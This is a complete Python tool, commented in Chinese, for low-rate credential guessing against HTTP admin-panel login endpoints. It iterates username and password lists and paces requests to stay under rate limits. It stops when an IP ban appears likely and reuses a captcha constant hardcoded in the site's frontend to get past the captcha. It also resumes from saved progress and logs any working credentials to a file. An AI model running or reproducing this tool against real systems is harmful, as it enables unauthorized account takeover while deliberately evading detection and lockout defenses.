#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""低频定向凭据核查器(HTTP 后台类目标)

设计要点(每条都是踩过的坑):
  * 列表**冻结** + 下标续跑:users x pws 的组合序列确定性生成,靠 --start/--limit 分片;
    改列表会让下标错位,要扩列表就另存文件另起一次调用。
  * **三态** allowed/denied/unknown:限流(Too many requests)/5xx/空响应/非预期 JSON 一律 unknown,
    **绝不**读成命中。
  * 连接类失败(HTTP 000/空响应/TLS 抖动)重试 --retry 次,**不计熔断**。
  * 连续 --breaker 次 unknown 立即熔断落盘(按出口 IP 封禁处理)。
  * 低频:--rate 是**总速率**(req/s),按线程数均分;实测 2.0 对国内后台/CDN 安全。
  * 命中即停,落盘完整响应体。

用法:
  python lowrate_cred_probe.py --url https://panel/api/app/proxy/login \
      --users users.txt --pws pws.txt --dir D:/渗透/<target>_recon \
      --captcha <首页JS写死的常量> --start 0 --limit 2400 --threads 6 --rate 2.0

  # 先干跑看规模与续跑点
  python lowrate_cred_probe.py ... --dry-run

  # 续跑:把 cn_probe_progress.json 里的 done 作为 --start
"""
import argparse
import json
import os
import sys
import threading
import time
import urllib.parse
import urllib.request
from datetime import datetime

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

DEFAULT_FAIL = ['"status":103', '用户名或密码错误', '用户名密码错误']
DEFAULT_HIT = ['"token"', '"status":200', '"perms"', '"roleNames"', '"accessToken"']


def read_list(path):
    out = []
    with open(path, encoding="utf-8", errors="replace") as f:
        for line in f:
            s = line.strip()
            if s and not s.startswith("#"):
                out.append(s)
    return out


def build(users, pws):
    """确定性序列:外层用户名、内层口令。任何改动都会打乱下标 —— 开跑后不许改。"""
    return [(u, p) for u in users for p in pws]


class Probe:
    def __init__(self, a):
        self.a = a
        self.lock = threading.Lock()
        self.done = 0
        self.unknown_streak = 0
        self.hit = None
        self.abort = False
        self.opener = urllib.request.build_opener()
        self.fail_mk = a.fail_marker or DEFAULT_FAIL
        self.hit_mk = a.hit_marker or DEFAULT_HIT
        self.total = a.start

    def one(self, u, p, attempt=0):
        data = urllib.parse.urlencode({
            self.a.field_user: u,
            self.a.field_pass: p,
            self.a.field_captcha: self.a.captcha,
        }).encode()
        req = urllib.request.Request(self.a.url, data=data, method="POST")
        req.add_header("User-Agent", UA)
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("X-Requested-With", "XMLHttpRequest")
        if self.a.origin:
            req.add_header("Origin", self.a.origin)
            req.add_header("Referer", self.a.origin + "/")
        try:
            with self.opener.open(req, timeout=self.a.timeout) as r:
                body = r.read().decode("utf-8", "replace")
                code = r.status
            if not body.strip() and attempt < self.a.retry:
                time.sleep(1.5 + attempt)
                return self.one(u, p, attempt + 1)
            return code, body
        except Exception as e:
            if attempt < self.a.retry:
                time.sleep(1.5 + attempt)
                return self.one(u, p, attempt + 1)
            return 0, "ERR:%s" % str(e)[:120]

    def classify(self, code, body):
        if any(m in body for m in self.hit_mk):
            return "hit"
        if any(m in body for m in self.fail_mk):
            return "denied"
        return "unknown"          # 含 200+非预期 JSON:可能是锁定/禁用文案,值得看,但不算命中

    def log(self, msg):
        line = "%s %s" % (datetime.now().strftime("%H:%M:%S"), msg)
        print(line, flush=True)
        with open(self.a.log, "a", encoding="utf-8") as f:
            f.write(line + "\n")

    def worker(self, queue):
        while True:
            with self.lock:
                if self.abort or self.hit or not queue:
                    return
                u, p = queue.pop(0)
            t0 = time.time()
            code, body = self.one(u, p)
            kind = self.classify(code, body)
            with self.lock:
                self.done += 1
                n = self.done
                if kind == "hit":
                    self.hit = (u, p)
                    with open(self.a.hitfile, "a", encoding="utf-8") as f:
                        f.write("HIT user=%s pass=%s\nHTTP %s\n%s\n%s\n"
                                % (u, p, code, body[:2000], "-" * 40))
                    self.log("@@@@ HIT user=%s pass=%s" % (u, p))
                    return
                if kind == "unknown":
                    self.unknown_streak += 1
                    self.log("UNKNOWN[%d] %s/%s -> HTTP %s %s"
                             % (self.unknown_streak, u, p, code, body[:160].replace("\n", " ")))
                    if self.unknown_streak >= self.a.breaker:
                        self.abort = True
                        self.log("!!!! 连续 %d 次 unknown,按封禁熔断(已试 %d)!!!!"
                                 % (self.unknown_streak, self.a.start + n))
                        return
                else:
                    self.unknown_streak = 0
                if n % 50 == 0:
                    with open(self.a.prog, "w", encoding="utf-8") as f:
                        json.dump({"done": self.a.start + n, "total": self.total,
                                   "last": "%s/%s" % (u, p)}, f, ensure_ascii=False)
                    self.log("progress %d/%d last=%s/%s" % (self.a.start + n, self.total, u, p))
            if self.a.rate > 0:
                per = self.a.threads / float(self.a.rate)
                wait = per - (time.time() - t0)
                if wait > 0:
                    time.sleep(wait)

    def run(self, queue):
        self.total = self.a.start + len(queue)
        self.log("=== start=%d queued=%d threads=%d rate=%s url=%s ==="
                 % (self.a.start, len(queue), self.a.threads, self.a.rate, self.a.url))
        ths = [threading.Thread(target=self.worker, args=(queue,), daemon=True)
               for _ in range(self.a.threads)]
        for t in ths:
            t.start()
        for t in ths:
            t.join()
        tot = self.a.start + self.done
        if self.hit:
            self.log("=== STOPPED-ON-HIT tried=%d total=%d ===" % (self.done, tot))
            return 0
        if self.abort:
            self.log("=== ABORTED(封禁疑似) tried=%d total=%d/%d ===" % (self.done, tot, self.total))
            return 2
        self.log("=== finished tried=%d total=%d/%d NO HIT ===" % (self.done, tot, self.total))
        return 0


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="登录端点完整 URL")
    ap.add_argument("--users", required=True)
    ap.add_argument("--pws", required=True)
    ap.add_argument("--dir", default=".", help="日志/命中/进度落盘目录")
    ap.add_argument("--start", type=int, default=0)
    ap.add_argument("--limit", type=int, default=0, help="0=全部剩余")
    ap.add_argument("--threads", type=int, default=6)
    ap.add_argument("--rate", type=float, default=2.0, help="目标总速率 req/s,0=不限")
    ap.add_argument("--breaker", type=int, default=8, help="连续 unknown 熔断阈值")
    ap.add_argument("--retry", type=int, default=2, help="连接类失败重试次数(不计熔断)")
    ap.add_argument("--timeout", type=int, default=20)
    ap.add_argument("--field-user", default="userName")
    ap.add_argument("--field-pass", default="password")
    ap.add_argument("--field-captcha", default="captchaId")
    ap.add_argument("--captcha", default="", help="前端写死的 captchaId 常量")
    ap.add_argument("--origin", default="", help="Origin/Referer 基址,留空从 --url 推导")
    ap.add_argument("--hit-marker", action="append", default=None, help="命中特征串(可多次)")
    ap.add_argument("--fail-marker", action="append", default=None, help="失败特征串(可多次)")
    ap.add_argument("--dry-run", action="store_true")
    a = ap.parse_args()

    os.makedirs(a.dir, exist_ok=True)
    a.log = os.path.join(a.dir, "cn_probe.log")
    a.hitfile = os.path.join(a.dir, "cn_probe_hit.txt")
    a.prog = os.path.join(a.dir, "cn_probe_progress.json")
    if not a.origin:
        sp = urllib.parse.urlsplit(a.url)
        a.origin = "%s://%s" % (sp.scheme, sp.netloc)

    users, pws = read_list(a.users), read_list(a.pws)
    allp = build(users, pws)
    if a.dry_run:
        print("users=%d pws=%d total=%d" % (len(users), len(pws), len(allp)))
        print("first 5:", allp[:5])
        print("resume from", a.start, "-> remaining", len(allp[a.start:]))
        return 0

    queue = allp[a.start:]
    if a.limit:
        queue = queue[:a.limit]
    if not queue:
        print("队列为空(检查 --start 是否超出总数 %d)" % len(allp))
        return 1
    if not a.captcha:
        print("[!] 未提供 --captcha:先在首页 JS 里搜出写死的 captchaId 常量;"
              "留空提交会得到 unknown 从而熔断。")
    return Probe(a).run(queue)


if __name__ == "__main__":
    sys.exit(main())
